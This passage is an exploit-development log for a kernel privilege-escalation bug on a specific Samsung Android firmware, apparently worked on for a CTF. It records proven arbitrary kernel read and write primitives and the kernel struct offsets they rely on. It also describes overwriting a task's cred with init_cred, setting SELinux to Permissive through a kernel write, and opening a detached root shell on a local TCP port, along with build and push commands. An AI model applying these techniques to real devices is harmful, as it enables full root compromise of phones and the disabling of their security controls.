`str parent_color, [rb_left]` then dest is `parent+0x10` only if
`parent->rb_left == waiter`, else `parent+8`. The waiter is on the
*stack*; `parent->rb_left` will not equal it. Dest is therefore
**parent+8**. `parent = &ctl_table.data - 8` writes Q into `.data`.
The old `parent = data-0x10` writes Q into `.procname` — that is why
`boot_id` vanished (`\x82bC` dent) while the UUID stayed put.

**app21 “arb-read” was a false positive.**
`f94d5b1bf7af8f13` is the live `boot_id` UUID of that boot
(`138faff7-1b5b-4df9-…`), not `init_task`. Leafless
`404ef8c8…` was `proc_do_uuid(NULL)`. Walk/fire is real; the erase
did not retarget `.data`.

**app25/26** use `parent=data-8`, `Q=mm+0x330`. 8+8 attempts, one
fire (app26 att1): `lo=cf47fcb98eafa46f hi=0957cacc166230be` — not
parent and not a task pointer. `boot_id` file still exists
(`d760d64b-5172-4737-…`). Erase destination still not proven.
`DIRECT_CRED_CHAIN` waits for `hi` in `0xffffff…`.

**app28 att1 — ARBITRARY READ PROVEN.**
Q = `init_task+0x828` (`ptracer_cred`). Fire:
`lo=ffffffc00a5162e8` (== parent)
`hi=ffffffc00994f018` (== `init_cred` + slide `0x1a0000`).
`parent=data-8` plants Q into `boot_id` `.data`; `Q+0` is overwritten
with parent; `Q+8` is the wanted qword. `current` is `SP_EL0`.
`task.cred`/`real_cred` = `+0x838`/`+0x830`. Next: walk
`init_task.tasks` (`+0x550`) to our pid (`+0x630`) and
`DIRECT_ERASE_WRITE` `task->cred` to the page root-cred image.

**app30 att4** repeated the proof on slide `0x20000`:
`hi=ffffffc0097cf018` = `init_cred+0x20000`. Walk then started and
panicked on `Q=init_task+0x548` (last qword of `sched_info`). Do not
smash `tasks-8`.

**app31** (slide `0x0`, pid-first walk, no list smash): 0/8 fires.
Device stayed up. Fire rate is still ~1/8.

### Kernel RE — settled map (2026-08-17)

`current` is `mrs SP_EL0`. There is no user-reachable `current_task`.
`__entry_task` is per-cpu exception scratch next to `overflow_stack`
(app24 first shot panics). `kdp_enable` / `init_cred_kdp` are 0.

| Field / symbol | Offset / unsild VA | Notes |
| --- | --- | --- |
| `init_task` | `0xffffff80022cf8c0` | p0 profile + nm |
| `init_cred` | `0xffffff80017af018` | usage=4, uids=0 |
| `init_pid_ns` | `0xffffffc00a261c70` | `idr` at +0, `child_reaper` at +0x30 |
| `init_struct_pid` | `0xffffffc00a261cf0` | `tasks[]` at +0x10 |
| `task.tasks` | +0x550 | list_head |
| `task.pid` | +0x630 | smash `restart_block` tail at +0x628 to read |
| `task.real_parent` | +0x640 | BTF 12800 |
| `task.parent` | +0x648 | |
| `task.children` | +0x650 | list_head |
| `task.sibling` | +0x660 | |
| `task.ptracer_cred` | +0x828 | safe smash slot (app28/30) |
| `task.real_cred` / `cred` | +0x830 / +0x838 | |
| `task.comm` | +0x848 | |
| `mm.ioctx_table` / `owner` | +0x330 / +0x338 | |

**Arbitrary read/write primitive (proven).**
`rb_erase` one-right-empty: dest = `parent+8`. Set `parent = data-8`
so dest is `ctl_table.data`. Plant Q there. `boot_id` then returns
16 bytes at Q: `lo` is smashed with parent, `hi` is the wanted qword.
Write: `DIRECT_ERASE_WRITE` plants V at B=`DIRECT_BOOTID_ADDR`.

**Why uid is still 2000.**
We do not have *our* `task_struct*`.

1. `mm->owner` of the *dead* leak child is NULL (`mm_update_next_owner`
   on exit). `clone_leak_child` calls `exit(0)` after collisions.
   Pinning the mm with `/proc/pid/mem` keeps the page, not the owner.
2. `init_task.tasks-8` smashes `sched_info` (app30 panic).
3. `__entry_task` is on the exception stack (app24 panic).
4. Full task-list walk needs one successful fire per node (~1/8).

**Next path: `DIRECT_HOLD_MM`.**
New `clone_hold_child`: after `kernelsnitch_find_collisions`, `pause()`
instead of `exit`. Two `prepare_kernel_page` calls in one process:

1. Hold: leak live mm VA, keep child + memfd, do not reclaim that page.
2. Lock: normal 1-object reclaim for `fake_lock`.

Then 2–3 fires:

1. Q = `hold_mm+0x330` → `hi` = live `mm->owner` (hold child task)
2. Q = `owner+0x638` → `hi` = `real_parent` (us)
3. `DIRECT_ERASE_WRITE` `task->cred` / `real_cred` = `init_cred`

Backup: `init_pid_ns.idr.xa_head` at `init_pid_ns+8` and walk the
xarray to our pid. More fires than hold-mm.

**app32** `clone_hold_child` raced: parent called
`kernelsnitch_found_collisions` while child still at `KERNELSNITCH_INIT`.
4/4 hold leaks failed. Device stayed up.

**app33 att2** after waiting on `ks->state`: hold leak worked
(`mm=ffffff88b5070000` child=29265 still alive). Lock page separate
(`ffffff8a13f63800`). First fire `write ok=1` but `lo/hi` were the live
`boot_id` UUID — erase did not retarget `.data`. Retry fire then
panicked (typical reclaim-miss trylock). Collision wait raised to 20 s.
Next boot: new slide, same hold-mm chain.

**app34** slide `0x1f0000`. Hold leak 6/6 (live child + separate lock
page). First fire missed every attempt; hold-chain was gated on `ok`
so it never retried. Device stayed up.

**app35** moved owner-read retries outside the first-fire `ok` gate.
Att1/2: 16+16 misses, `hold-owner got=0`, device stayed up. Att3
panicked on retry fire (reclaim-miss trylock). Hold-mm VA is solid;
the remaining gate is a successful erase into `boot_id.data` while the
hold child is still paused.

**app36** slide `0xd0000`. Hold leak 3/3. Att1/2: 16+16 misses.
Att3 dropped adb mid-retry. Reset reason this boot was
`userrequested`/`RP`, not a new RWC line — may have been a hang
rather than a logged KP. Fire rate in hold-mm batches is worse than
the earlier `Q=init_task+0x828` 1/8. `Q=mm+0x330` has
`Q+8=owner != 0`; that is required for the read and matches the
proven `ptracer_cred`/`real_cred` pair (`Q+8=init_cred`). Keep
shooting.

### Session status 2026-08-17 ~12:20 — still uid 2000

**Proven**
- Arbitrary read via `boot_id`: `parent=data-8`, plant Q, `hi=Q+8`.
  app28 `hi=init_cred+0x1a0000`; app30 `hi=init_cred+0x20000`.
- KDP off. `current` = `SP_EL0`. `__entry_task` is exception-stack
  (app24 panic). Smash `sched_info` (`tasks-8`) panics (app30).
- Dead leak-child `mm->owner` is NULL (`mm_update_next_owner`).

**Implemented (`DIRECT_HOLD_MM`)**
- `clone_hold_child`: collisions then `pause()` (does not `exit`).
- Parent waits up to 20 s for `ks->state` in
  `{COLLISIONS_FOUND, COLLISIONS_NOT_FOUND}`.
- Two `prepare_kernel_page`s: hold mm (no reclaim) + lock page.
- After fire: Q=`hold_mm+0x330` → owner; Q=`owner+0x638` →
  `real_parent`; write `cred`/`real_cred` = `init_cred`.
- Files: `src/util.c`, `src/slide_app.c`, `src/common.h`,
  `src/targets/e3q-S9280ZCS6DZF2/target.h`
  (`TASK_REAL_PARENT_OFF=0x640` etc.).

**Device**
| Run | Slide | Hold leak | Erase into `.data` | uid | Notes |
| --- | --- | --- | --- | --- | --- |
| app28 | `0x1a0000` | n/a | yes (`init_cred`) | 2000 | arb-read proven |
| app30 | `0x20000` | n/a | yes | 2000 | walk smash `+0x548` panic |
| app31 | `0x0` | n/a | 0/8 | 2000 | pid-first, no list |
| app32 | `0x0` | 0/4 race | — | 2000 | child still INIT |
| app33 | `0x0` | 1/2 | fire but UUID | 2000 | retry panic |
| app34 | `0x1f0000` | 6/6 | 0 (no retry) | 2000 | chain gated on first `ok` |
| app35 | `0x1f0000` | 2+ | 0/32+ | 2000 | att3 retry drop |
| app36 | `0xd0000` | 3/3 | 0/32+ | 2000 | att3 adb drop; RP not KP |

**app37** slide `0xa0000`. Heavy dual-prepare. Att1 12+ misses then
adb drop.

**app38** retry cap 3. Att1 4 misses (survived). Att2 hold+lock then
drop during first fire.

**app39** light hold leak (no 32-slab spray). `hold light mm` +
`memfd=3`. Att1/2 completed 4+4 misses, device stayed up. Att3 dropped
after lock prepare. Light hold is the keeper; fire rate still ~0.

**app40** slide `0x1a0000`. First fire `write ok=1`. Did **not** read
`boot_id`; immediately started a second pselect and dropped. Code now
reads the first-fire oracle before any retry, and writes the **hold
child** `cred` (skip `real_parent` walk). Hold child polls `getuid`
and writes `/data/local/tmp/hold-root` on uid 0.

**app41** slide `0x0`. Light hold ok; dropped during lock prepare
before a fire.

**app42** slide `0x160000`. Att1/2 4+4 misses. Att3 drop after lock.

**app43** one fire/attempt. 6/8 attempts survived, **0/6 fires**,
drop on att7 lock prepare. Device stayed up 154s. Hold leak still
6/6. Next: control batch **without** `DIRECT_HOLD_MM`,
`Q=init_task+0x828`, to see if the live hold child is killing the
fire rate.

**app44 control** (no hold-mm, `Q=init_task+0x828` slid
`0xffffffc00a2900e8`, slide `0x40000`): 7/8 attempts survived, **0/7
fires**, drop on att8. Fire window is cold even on the proven Q.
`pselect` always `ret=0 sched_ok=1`; `write status=256`. Hold-mm is
not uniquely to blame. Keep shooting; first hit must read `boot_id`
before a second fire (app40 lesson).

### Direction check 2026-08-17 14:05

Hold-mm / cred-chain grinding since arb-read (app28, ~11:30) through
app44 (~14:00): **~2.5 h, still uid 2000**. The primitive is not the
blocker. `sched_setattr` walk fire is: 0/6 (app43 hold) and 0/7
(app44 proven `Q=init_task+0x828`). Same `pselect ret=0 sched_ok=1
write status=256` as the July 31 note.

Public GhostLock (OnePlus, same CVE) does **not** walk `init_task.tasks`
or smash `mm->owner` of a dead leak child. ADB-shell path:
`perf_find_task()` on a live child, then one PI write
`child->cred = init_cred`. Write-1 is `selinux_enforcing = 0` (no
task pointer needed).

**Stop** 8-shot hold-mm loops. Next useful work, in order:

1. Raise walk-fire rate: `SLIDE_CONSUMER_BURST=3` (this doc, July 31).
2. After one clean `write ok=1`, read `boot_id` **before** any second
   fire (app40).
3. Port `perf_find_task` for the hold/pselect child instead of
   `mm->owner` / task-list walk.
4. Optional first write: `SELINUX_ENFORCING` (known VA, no task).

**app45 `BURST=3`** slide `0x190000`. Att1 miss. Att2 **fired**
(`write ok=1`, `calls=2`). `boot_id` was read (good). `lo/hi` were
not parent/`init_cred` because `DIRECT_BOOTID_ADDR` was already slid
(`0xffffffc00a3e00e8`); `resolve_kernel_va` added slide again →
`child=0xffffffc00a5700e8`. Pass **unslid** `init_task+0x828`
(`0xffffffc00a2500e8`). Att3 then dropped. BURST=3 is the fire-rate
fix.

**app46** unsild `Q=init_task+0x828`, `BURST=3`, no hold: **2/4 fires**,
0 panics. Geometry locked:
`lo==parent`, `hi=init_cred+0xa0000` (`ffffffc00984f018`).

**app47** same boot + in-process `DIRECT_HOLD_MM`: **0/6 fires**.
Second `prepare_kernel_page` / live hold child kills the window.

**HOLD_LEAK_ONLY** (later): light leak + pause works
(`mm=ffffff88d78d7800`) but supervisor SIGKILL at timeout; never
paired with a fire process.

`perf_event_paranoid=-1` on device. PMU nodes present. GhostLock's
`perf_find_task` is viable from adb shell.

**Split-process (app48–50), slide `0x60000`.**
A: orphan hold child (no PDEATHSIG, 3 fds). `hold-mm.txt` works.
B app48/49: inherited pipe fds → `F_SETPIPE_SZ` EPERM.
B app50 (3 fds): env mm used, Q=`mm+0x330`, **one** lock prepare,
**0/6 fires**, device stayed up, child still alive. Live extra mm
still looks hostile to the window. Next: `perf_find_task`.

**app51 — kernel write proven. SELinux is Permissive.**
`BURST=3` `DIRECT_ERASE_WRITE` `ADDR=selinux_enforcing` (unslid
`0xffffffc00a521588`). Att1 `write ok=1` while `enforce=1`. Att2
startup already `enforce=0`. After the batch:
`/sys/fs/selinux/enforce=0`, `getenforce=Permissive`. uid still 2000.
GhostLock write-1 is done. GhostLock `find_task_by_tgid` uses
**pipe_read64**, not perf. Next: IDR/`perf`/pipe-physrw for a task
pointer, then `cred=init_cred`.

**app52** tried `Q=init_pid_ns` to read `xa_head`. Att1 miss. Att2
dropped adb — do **not** smash `init_pid_ns` lock. SELinux write
(app51) remains the last proven useful write.

**app53** `DIRECT_TASK_NEWEST`: Q=`init_task+0x550` (smash `tasks.next`,
read `prev` = newest if `list_add_tail`). 0/6 fires, device up. Q
geometry logged `child=...a2efe10` = slid init+0x550.

**app54** same boot, selinux write control: 0/4 fires, still Enforcing.
This boot's window is cold (0/10). Newest-task path is coded; needs a
hot boot like app46/51.

**app55** newest-task att1 dropped adb during pselect — likely the
first actual fire of `Q=init+0x550` corrupted `init.tasks.next`.
**Do not smash `init_task.tasks`.** Newest-task path is retired.

**app56** `DIRECT_HOLD_AFTER`: lock prepare OK, then light hold
`SYSCHK(kill)` ESRCH abort. `kill_child` now ignores ESRCH/ECHILD.

**app57** hold-after works: lock page then `hold light mm`, Q=`mm+0x330`.
Att1–3 miss. Att4 dropped during pselect. Plumbing is right; window
still hates a live extra mm. uid 2000.

**app58** slide `0x130000` selinux write, `BURST=3`: 0/6 fires, still
Enforcing, device stayed up (uptime 23 min). Window cold. Cred write
is waiting on a fire + a task pointer (hold-after or pipe physrw).

**app59** new boot slide `0x130000` HOLD_AFTER 8 planned. Att1–4
lock+leak+Q=`mm+0x330` all miss. Att5 dropped in pselect. Same
pattern as app57. uid 2000.

### Direction 2026-08-17 15:30 — stop spending fires on task*

Evidence, not preference:

1. **Primitive is done.** Read (app46 `hi=init_cred+slide`) and write
   (app51 SELinux → Permissive) both work. `BURST=3` + no extra mm
   is the only hot setup (2/4). Cold boots go 0/6–0/10.
2. **Hold-mm is a fire killer.** Same boot: app46 2/4 vs app47 0/6
   with in-process hold. Split B (app50) 0/6. HOLD_AFTER (app57/59)
   0 fire then pselect drop. One live extra mm is enough.
3. **List smash is a panic.** `init.tasks` (app55), `init_pid_ns`
   (app52). GhostLock does **not** PI-walk the task list.
4. **GhostLock `find_task_by_tgid` is `pipe_read64`**, after pipe
   physrw. Unlimited reads. Our boot_id oracle is 16 bytes per fire.
   Walking tasks with PI fires cannot win at 1/4 hit rate.
5. **CFI/pipe path is the designed unlimited R/W** (`try_cfi_stage`
   → `install_pipe_physrw` → `install_android_root`). We gated it
   off with `DIRECT_BOOTID_RECLAIM` to debug the oracle. SELinux
   off does not disable CFI; we still need a planted `fake_fops`
   (FOPS reclaim, no hold-mm).

**Do next (one track):** FOPS-only, `BURST=3`, no hold, no task
smash. Goal: `cfi misc_fops` matches `fake_fops`, then pipe physrw,
then `find_task_by_tgid` + `cred=init_cred`. Optional side: retarget
a *writable* sysctl `.data` (not `boot_id`) for reusable write.

**Do not:** more HOLD_AFTER 8-shots, newest-task, IDR smash, or
cred-chain until a fire happens *without* an extra mm.

**app60** FOPS-only `BURST=3`, no hold, slide `0xe0000`. mode=0
prepare OK. Att1–2 miss (`triggered=0`). Att3 dropped in pselect.
Never reached `try_cfi_stage`. FOPS lock still walks leftovers on
fire. Next: plant `fake_fops` into `ashmem_misc.fops` using the
**SLIDE 0x5200 lock** (safe miss), then call `try_cfi_stage`.

**app61** `DIRECT_FOPS_PLANT` + SLIDE lock: `WRITE_VALUE=0` because
`fake_fops` was unset. 0/6 fires, device up.

**app62** `fake_fops=page+0x1000` (payload `FOPS_TABLE_OFF`). Dest
`ashmem_misc.fops-8` correct. 0/6 fires, no panic, no CFI. Window
cold. Plant path is ready for a hot boot.

**app63** heat check `Q=init+0x828` same boot: 0/2. Still cold.
Do not grind this boot.

### Session 2026-08-17 16:55–19:10 — DIRECT_CRED_SELF + 250 ms window

Device recovered via `fix-adb.ps1` (kill adb processes) after a USB
drop.  Boot A slide `0x1d0000` (tracefs), uptime 1h27m, load ~3.

**app64** (`DIRECT_FOPS_PLANT`, BURST=3, slide `0x1d0000`): attempt 1
FIRED (`write ok=1`, burst `calls=2`), ashmem open `ENODEV` →
`fops-plant cfi=0 step=11` — foreign page at `fake_fops` (reclaim
miss).  Attempts 2–4 miss.  Device up.

**app65**: attempt 2 FIRED (`ok=1`), open `EACCES` ×2; attempt 3
dropped adb.  **RWC 121: `Oops - CFI PC:misc_open+0x11c`, target
`0xffffff8a04b18c80`, x24=`0xffffff802b261000`** — exactly attempt
2's planted `fake_fops` value.  First hard proof the plant WRITE
lands on the real `ashmem_misc.fops`; the table content was foreign
(reclaim miss), so the next `misc_open` (QuickSettingsTile, an
innocent system process) CFI-panicked.  Delayed-blast pattern again.

**rb_erase disasm locked** (vmlinux.elf `0xffffffc0090fa95c`):
one-left-child path `+0x84`: `[child+0] = node->parent_color`
(collateral; the `rb_erase+0x8c` fault site of KP #75/#78), then
dest = `parent+0x10` iff `[parent+0x10]==node` else `parent+8`, and
`[dest] = child`.  With our armed waiter (`tree_left=V`,
`tree_right=0`, `parent=B-8`): **`[B]=V`, `[V+0]=B-8`**.  B and V must
both be writable kernel VAs.

**Pivot rationale.**  FOPS root needs a *content-controlled* reclaim
of the freed mm_struct page (never observed in weeks of runs).  The
proven primitives (boot_id/uuid arb-read on CHILD fires, one-child
rb_erase arb-write) need no reclaimed content.  GhostLock's
`perf_find_task` (self-sampling port) supplies the one missing
address — our own `task_struct` — without any kernel list walk.

**Implemented `DIRECT_CRED_SELF`** (this session):
- `src/util.c` `perf_find_task_self()`: per-task SOFTWARE CPU_CLOCK
  perf event, `PERF_SAMPLE_IP|PERF_SAMPLE_REGS_INTR` (mask
  `0xffffffff`), mmap ring, 500k `getpid` spin; votes all sampled
  kernel regs in `0xffffff80_00000000..0xfffffffe_00000000`; logs top
  3 candidates.  VMAP stack pointers fall below the range filter, so
  the winner is a physmap (SLUB) per-process object.
- `src/slide_app.c` `app_cred_self_route()` (hooked at the top of the
  active `app_trigger_fops_slide_route`, env `DIRECT_CRED_SELF=1`):
  fire 1 = `slide_fire_read64(task+0x628)` → `hi` = pid|tgid at
  `+0x630`, must both equal `getpid()` (validation; skip with
  `DIRECT_CRED_SELF_NOVALIDATE=1`); fire 2 =
  `slide_fire_write64(task+TASK_CRED_OFF, text_addr(INIT_CRED))`.
  Collateral `[init_cred+0]=task+0x830` smashes `init_cred.usage/uid`
  (uid reads `0xffffff88`) but leaves caps intact
  (`cap_effective=0x1ffffffffff`), so `setresgid(0,0,0)` +
  `setresuid(0,0,0)` via CAP_SETUID mints a fresh clean root cred and
  also repairs `real_cred`.  On `uid==0`: proof file
  `/data/local/tmp/cred-self-root.txt`, best-effort `enforce=0`
  (init_cred SID = kernel domain), detached TCP root shell on
  `127.0.0.1:5559` (`adb forward tcp:5559 tcp:5559`).
- `src/targets/e3q-S9280ZCS6DZF2/target.h`: `TASK_PID_OFF=0x630`.
- Route knob: `SLIDE_ENTER_DELAY_PIN=1` keeps a caller-provided
  `SLIDE_ENTER_DELAY_USEC` instead of cycling the built-in array.

**app66 — perf needs Permissive.**  Every attempt:
`perf_event_open errno=13` despite `perf_event_paranoid=-1`.  The
SELinux `perf_event_open` hook denies shell under Enforcing.  So the
boot-level order is: one selinux write (app51 config) → Permissive →
cred-self batches.  (app51's leafless-zero mechanics re-verified
empirically this session: a completed fire with the run-selinux.sh
config does yield `enforce=0`.)

**Burst-calls=1 root cause + fix.**  Cold-boot logs showed
`consumer sched idx=0` only (`calls=1`) even with `BURST=3`: idx=0's
`sched_setattr` blocks in-kernel ~40–190 ms (the unresolved 39–340 ms
duration), and fix #17's armed gate then kills idx=1+.  With
`SLIDE_PSELECT_TIMEOUT_MS=250` (armed frame outlives the ~150 ms
residue death, so retry-loop walks exit quietly instead of
dead-frame panics) + `SLIDE_ENTER_DELAY_USEC=60000`
(+PIN) + `BURST=5 SPACING=5000`, **app74 attempt 3: `calls=5
sched_ok=5 ret=6`, fired, completed cleanly, `enforce=0`, no
panic.**  Note: `calls=1` windows are no-residue windows — the
residue is decided at the waiter's 50 ms cleanup, so extra shots only
help when the residue exists (app74's firing pattern).  Panic-avoidance
is the 250 ms window's real win.

**app75** (cred-self, Permissive, slide `0x1d0000`): perf scan works —
winner always a fresh physmap VA (~114/512 votes, 2:1 margin over a
boot-constant kimage second `0xffffffc00a41dbc0`), exactly the
task_struct signature.  But 18 read windows produced **0 fires** →
validation never ran.  Post-batch: **RWC 124 softdog 100 s hang**
(delayed blast from a silent fire) and **RWC 125 trylock panic**
(teardown walk) — two reboots, slides `0x1d0000` then `0x1c0000`.

**app78** (selinux, slide `0x1c0000`, 250 ms window): 6 attempts,
0 fires, still Enforcing, device up.  Grind continues.

**Operational notes (this session).**
- adb "no devices/emulators found" transients recur; fix = kill adb
  processes + `start-server` (`fix-adb.ps1`).  Never mid-batch.
- Bash wrapper scripts calling adb fail under background jobs; launch
  each batch as a direct async `adb shell` job instead.
- Batch cadence that worked: foreground-blocking runs with explicit
  enforce/uptime checks between batches; pull `/data/log/prev_dump.log`
  FIRST after every reset (rotates each boot).

**Fire economics (all of today's data).**  Residue fire ≈ 1/10–1/6 per
window; a fire completes (zeroed-or-ours lock page) ≈ 1/3, else
panic/hang (foreign page).  Root needs 2 completing fires per boot
with `NOVALIDATE` (selinux + cred) or 3 with validation.  The 250 ms
window removes the dead-frame panic class; foreign-page panics remain
the boot-killer.

**Next (ordered).**
1. Grind selinux batches (6 attempts) until `enforce=0`.
2. Same boot: `run-credself.sh` batches.  First success validates the
   perf winner (pid match); afterwards use `DIRECT_CRED_SELF_NOVALIDATE=1`
   to spend all windows on the write.
3. On `cred-self ROOT`: verify `/data/local/tmp/cred-self-root.txt`,
   `adb forward tcp:5559 tcp:5559` for the root shell, then read the
   CTF flag.





















**Next shot**
1. Confirm adb + uptime ≥ 4 min.
2. If slide unknown, `sh /data/local/tmp/run-slide.sh`.
3. `DIRECT_HOLD_MM=1 DIRECT_BOOTID_CHILD=1 DIRECT_BOOTID_BOOTID=1`
   `SLIDE_P0_OFFSET=<slide>` `EXPLOIT_ATTEMPTS=6`.
4. Need `hold-owner got=1` with `hi` a kernel ptr, then parent, then
   `hold-cred done uid=0`.
5. Backup if hold-mm fire rate stays ~0: plant Q=`init_task+0x828`
   (proven) first, or walk `init_pid_ns.idr.xa_head`.

**Do not**
- Smash `init_task+0x548` / `__entry_task`.
- Reuse a P0 `DIRECT_BOOTID_ADDR` across reboots.
- Assume dead-child `mm->owner` is live.

## Files Modified

All S9280 session changes through 2026-08-17 01:20 are in this commit
(working tree was CRLF; use `git diff -w` against older revs).


| File | Changes |
|------|---------|
| `src/util.c` | KernelSnitch bruteforce stride `MM_STRUCT_SZ` -> `MM_STRUCT_SLAB_SZ` (fix #9); `EXPLOIT_CORE`/`exploit_core()`; cleanup before sends; knob plumbing; `SKB_SNDBUF` env override; `P0_ORACLE_PARENT_PIPEBUF` reclaim-vs-walk diagnostic knob; fix #19 reclaim ordering; fix #21 `LATE_NEIGHBOUR_FREE`; fix #22 `COMPACT_PAYLOAD`; fix #23 `SKB_RECLAIM_SOCKS`; fix #26 `DGRAM_RECLAIM`; fix #28 `SLABINFO_DIAG`; fix #29 `RECLAIM_WAVES`; fix #30 `RECLAIM_WAVE_ANON`; fix #32 `DGRAM_QLEN`; fix #33 compact-mode slot parents/targets; fix #34 `ZERO_DRAIN_FREE`; fix #35 `HOLD_PREPARE_CTX` |
| `src/common.h` | `MM_STRUCT_SLAB_SZ`; runtime knobs (`SKB_RECLAIM_SENDS`, `MM_DRAIN_TRIGGERS`, `KSNITCH_DEFAULT_PROFILE`); `exploit_core()` declaration; `KSNITCH_COLLISIONS` now `#ifndef`-guarded (fix #27) |
| `src/fops.c` | Shift-aware `prepare_pselect_fdsets`, pipe fill before pselect, consumer completion wait |
| `src/util.c` | KernelSnitch bruteforce stride `MM_STRUCT_SZ` -> `MM_STRUCT_SLAB_SZ` (fix #9); `EXPLOIT_CORE`/`exploit_core()`; cleanup before sends; knob plumbing; `SKB_SNDBUF` env override; `P0_ORACLE_PARENT_PIPEBUF` reclaim-vs-walk diagnostic knob; fix #19 reclaim ordering (neighbours freed before drain pressure; supersedes reverted fix #18); fix #21 `LATE_NEIGHBOUR_FREE` (drains first, `close(memfd_leak)` last so the empty target slab is discarded to the buddy allocator); fix #22 `COMPACT_PAYLOAD` (4 KB walk image + anon-fault reclaim, shelved); fix #23 `SKB_RECLAIM_SOCKS` (up to 8 socketpairs multiplying the queued frag volume); fix #26 `DGRAM_RECLAIM` (content-controlled dgram data kmalloc spray); fix #28 `SLABINFO_DIAG` (three-point slab census); fix #29 `RECLAIM_WAVES` (periodic reclaim bursts across the arming window); fix #30 `RECLAIM_WAVE_ANON` (per-wave 2 MB anon image faults + 4 MB wave SO_SNDBUF) |
| `src/pipe.c` | `objs_per_slab` uses `MM_STRUCT_SLAB_SZ`; pipe page child lifecycle aligned with `prepare_kernel_page` (fix #10); gate diagnostic continues past tee/read failures with `tee_failures` counter (fix #13); fix #31 gate tenant identification dump (non-zero byte count + qwords at +0x40/+0x980/+0x9C0/+0xA20 on marker miss) |
| `src/main.c` | `exploit_core()` call sites; consumer diagnostic logging |
| `src/slide_app.c` | `P0_ORACLE_GATE_DIAG` gate-verify on trigger failure; `cmp_requeue_pi` logging; `SLIDE_CONSUMER_BURST`/`SLIDE_CONSUMER_SPACING_USEC`; `SLIDE_ENTER_DELAY_USEC`/`PSELECT_DELAY_USEC` delay forcing; pselect copy-back dump on fires (fix #14); `SLIDE_OWNER_UNLOCK` owner-unlock trigger (fix #16); `SLIDE_ENTER_DELAY_PIN`; `app_cred_self_route()` + `DIRECT_CRED_SELF[_NOVALIDATE]` + TCP root shell (2026-08-17 PM) |

2026-08-17 PM additions (this session): `src/util.c` `perf_find_task_self()`
+ decl in `src/common.h`; `src/slide_app.c` `app_cred_self_route()` and the
route hook in `app_trigger_fops_slide_route`; `TASK_PID_OFF=0x630` in
`src/targets/e3q-S9280ZCS6DZF2/target.h`.

## Build & Test

```sh
# Build (requires Android NDK r29)
export ANDROID_NDK_HOME=/path/to/android-ndk
make TARGET=e3q-S9280ZCS6DZF2

# Test root-umh variant
adb push build/e3q-S9280ZCS6DZF2/cve-2026-43499 /data/local/tmp/
adb shell chmod 755 /data/local/tmp/cve-2026-43499
adb shell "EXPLOIT_ATTEMPTS=8 EXPLOIT_ATTEMPT_TIMEOUT_SEC=45 \
  LD_PRELOAD=/data/local/tmp/cve-2026-43499 /system/bin/id"

# Test app variant (requires release build)
make TARGET=e3q-S9280ZCS6DZF2 release
adb push build/e3q-S9280ZCS6DZF2/cve-2026-43499-app.release.so \
  /data/local/tmp/cve-2026-43499-app.so
adb shell "LD_PRELOAD=/data/local/tmp/cve-2026-43499-app.so /system/bin/id"

# P0 gate oracle scan (debug build, background, log to file)
make TARGET=e3q-S9280ZCS6DZF2
adb push build/e3q-S9280ZCS6DZF2/cve-2026-43499-app.so \
  /data/local/tmp/cve-2026-43499-app-dbg.so
adb shell "P0_ORACLE_GATE_DIAG=1 \
  LD_PRELOAD=/data/local/tmp/cve-2026-43499-app-dbg.so /system/bin/id" \
  > /tmp/gate-scan.log 2>&1
# Expect kernel panics / device reboots; adb returns after ~60-90 s.
# Files in /data/local/tmp survive reboots.
```

On this machine: `adb` =
`/mnt/c/Users/rainchan/AppData/Local/Android/Sdk/platform-tools/adb.exe`
(WSL interop), `ANDROID_NDK_HOME` =
`/mnt/c/Users/rainchan/AppData/Local/Android/Sdk/ndk/29.0.14206865`

## References

- S928U debugging record: `docs/SM-S928U1-S928U1UES6DZF2.md`
- Porting guide: `docs/PORTING.md`
- Project README: `README.md`
